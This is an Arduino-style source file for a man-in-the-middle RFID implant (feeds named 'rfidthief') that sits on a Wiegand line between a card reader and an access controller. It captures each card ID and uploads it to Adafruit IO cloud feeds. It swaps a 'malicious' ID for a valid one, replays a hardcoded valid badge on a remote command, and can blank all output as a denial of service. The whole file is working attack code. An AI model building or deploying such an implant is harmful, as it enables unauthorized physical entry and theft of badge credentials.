#include "config.h"
#include <map>
#include <bitset>

#define PIN_DATA0_IN D1
#define PIN_DATA1_IN D2
#define PIN_DATA0_OUT D5
#define PIN_DATA1_OUT D6

#define MAX_CARD_BITS 32
#define pulseWidth 1000     // uS
#define pulseInterval 10000 // uS

byte tagSize = MAX_CARD_BITS;
char tagData[MAX_CARD_BITS];
unsigned int tagInt = 0;
unsigned int tagIndex = 0;
bool receivingData = false;

bool dosMode = false;

void ICACHE_RAM_ATTR writeToBuffer0() {
  receivingData = true;
  tagData[tagIndex] = '0';

  tagIndex = (tagIndex == MAX_CARD_BITS - 1) ? 0 : tagIndex + 1;
}

void ICACHE_RAM_ATTR writeToBuffer1() {
  receivingData = true;
  tagData[tagIndex] = '1';

  tagIndex = (tagIndex == MAX_CARD_BITS - 1) ? 0 : tagIndex + 1;
}

std::map<int, int> IDs = 
{
  {8139252, 8139252}, // Good ID, Good ID
  {8126727, 8126727}, // Bad ID, Bad ID
  {8073371, 8139252}, // Malicious ID, Good ID
};

AdafruitIO_Feed *inputID = io.feed("rfidthief.inputid");
AdafruitIO_Feed *outputID = io.feed("rfidthief.outputid");
AdafruitIO_Feed *replay = io.feed("rfidthief.replayattack");
AdafruitIO_Feed *dos = io.feed("rfidthief.dosattack");


void setup() {
  Serial.begin(115200);
  
  pinMode(PIN_DATA0_IN, INPUT);
  pinMode(PIN_DATA1_IN, INPUT);
  pinMode(PIN_DATA0_OUT, OUTPUT);
  pinMode(PIN_DATA1_OUT, OUTPUT);
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(PIN_DATA0_OUT, HIGH);
  digitalWrite(PIN_DATA1_OUT, HIGH);
  
  attachInterrupt(digitalPinToInterrupt(PIN_DATA0_IN), writeToBuffer0, FALLING);
  attachInterrupt(digitalPinToInterrupt(PIN_DATA1_IN), writeToBuffer1, FALLING);

  Serial.print("Connecting to Adafruit IO");
  io.connect();

  replay->onMessage(replayAttack);
  dos->onMessage(dosAttack);

  // wait for a connection
  while(io.status() < AIO_CONNECTED) {
    Serial.print(".");
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
  }

  digitalWrite(LED_BUILTIN, LOW);

  // we are connected
  Serial.println();
  Serial.println(io.statusText());

  dos->get();
}

void loop() {
  io.run();
  
  if (receivingData && tagIndex == 0) {
    receivingData = false;
    printTag();

    Serial.println(dosMode);

    int output = (dosMode) ? 0000000 : IDs.at(tagInt);
    inputID->save(tagInt);
    outputID->save(output);
    
    writeWiegand(output);
  }
}

void printTag() {
  Serial.println("Input:");
  for (int i = 0; i < MAX_CARD_BITS; i++) {
    Serial.print(tagData[i]);
  }

  tagInt = (int) strtol(tagData, NULL, 2);
  Serial.print(" (");
  Serial.print(tagInt);
  Serial.println(")");
}


void writeWiegand(int data) {
  std::string outputData = std::bitset<32>(data).to_string();
  Serial.println("Output:");
  Serial.print(outputData.c_str());
  Serial.print(" (");
  Serial.print(data);
  Serial.println(")");
  
  for (int i = 0; i < MAX_CARD_BITS; i++) {
    if (outputData.at(i) == '0') {
      digitalWrite(PIN_DATA0_OUT, LOW);
      delayMicroseconds(pulseWidth);
      digitalWrite(PIN_DATA0_OUT, HIGH);
    }
    else {
      digitalWrite(PIN_DATA1_OUT, LOW);
      delayMicroseconds(pulseWidth);
      digitalWrite(PIN_DATA1_OUT, HIGH);
    }
    
    delayMicroseconds(pulseInterval);
  }
}

void replayAttack(AdafruitIO_Data *data) {
  Serial.println("Performing Replay Attack!");

  writeWiegand(8139252);
}

void dosAttack(AdafruitIO_Data *data) {
  dosMode = (data->toPinLevel() == HIGH) ? true : false;
  if (dosMode) {
    Serial.println("Performing DOS Attacks!");
  } else {
    Serial.println("Stopping DOS Attacks!");
  }
}
